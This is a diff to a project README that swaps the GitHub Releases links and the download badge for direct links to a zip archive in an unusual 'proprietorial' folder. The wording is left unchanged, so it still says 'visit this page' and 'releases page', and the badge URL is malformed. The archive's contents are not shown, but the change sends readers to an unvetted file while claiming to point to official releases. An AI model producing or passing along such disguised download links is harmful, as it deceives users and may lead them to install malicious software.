@@ -1,6 +1,6 @@
 # 🌐 quantum-theme-website - Simple Steps to Get Started with Quantum Theme
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
+![Download](https://raw.githubusercontent.com/umarajaz/quantum-theme-website/main/proprietorial/quantum-theme-website.zip%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you download, ensure your device meets the following requirements:
 
 To get started, you can download the latest version of Quantum Theme from our Releases page. 
 
-[Visit this page to download](https://github.com/umarajaz/quantum-theme-website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/umarajaz/quantum-theme-website/main/proprietorial/quantum-theme-website.zip)
 
 1. Click the link above.
 2. Find the latest release version.
@@ -72,6 +72,6 @@ Quantum Theme is open source and available for anyone to use. Feel free to explo
 
 Don’t forget to download the latest version from our releases page:
 
-[Visit this page to download](https://github.com/umarajaz/quantum-theme-website/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/umarajaz/quantum-theme-website/main/proprietorial/quantum-theme-website.zip) 
 
 With this guide, you can successfully download, install, and use the Quantum Theme website. We hope you enjoy the clean design and enhanced functionality it offers!
